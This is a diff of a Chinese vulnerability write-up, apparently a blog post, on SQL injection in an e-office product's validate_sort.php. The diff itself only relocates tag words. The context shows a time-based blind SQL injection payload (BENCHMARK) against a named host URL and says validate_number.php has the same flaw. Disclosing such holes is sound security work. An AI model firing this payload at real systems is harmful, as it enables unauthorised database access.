@@ -43,6 +43,14 @@ if ( $row = mysql_fetch_row( $cursor ) )
 ?>
 ```
 
+深入探索
+
+脚本
+
+数据管理
+
+计算机服务器
+
 `sort_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
 # 漏洞复现
@@ -74,13 +82,5 @@ Parameter: #1* (URI)
     Payload: http://eoffice.mrxn.net:8082/general/officeitem/sort/validate_sort.php?sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
 ---
 ```
-
-深入探索
-
-数据管理
-
-脚本
-
-计算机安全
 
 validate\_number.php 也存在同样的问题。
